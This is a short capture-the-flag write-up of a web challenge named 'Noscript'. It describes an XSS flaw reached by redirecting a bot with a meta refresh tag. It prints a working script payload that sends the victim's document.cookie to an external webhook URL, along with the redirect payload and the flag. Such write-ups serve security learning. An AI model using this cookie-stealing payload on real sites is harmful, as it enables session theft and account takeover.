# Web - Noscript
Solved by **vicevirus**

## Question
Ignite it to steal the cookie!

## Solution
There's an XSS vulnerability in `/username` endpoint but problem is the bot wont visit the endpoint. \

We can redirect the bot to `/username` using HTML  `<meta>` tag and then it will visit our XSS payload and get us the cookie.

Set the username to:\
```
<script>fetch('https://webhook.site/9dc131ee-4266-4339-b1d7-7956ba38ade2/'+document.cookie, {mode: 'no-cors'})</script>
```

Then set the profile to:\
```
<meta http-equiv="refresh" content="0; url=/username/390f94bf-4011-4814-8f7c-4c64e37810ab">
```

and then report it.

### Flag
`FLAG{n0scr1p4_c4n_be_d4nger0us}`
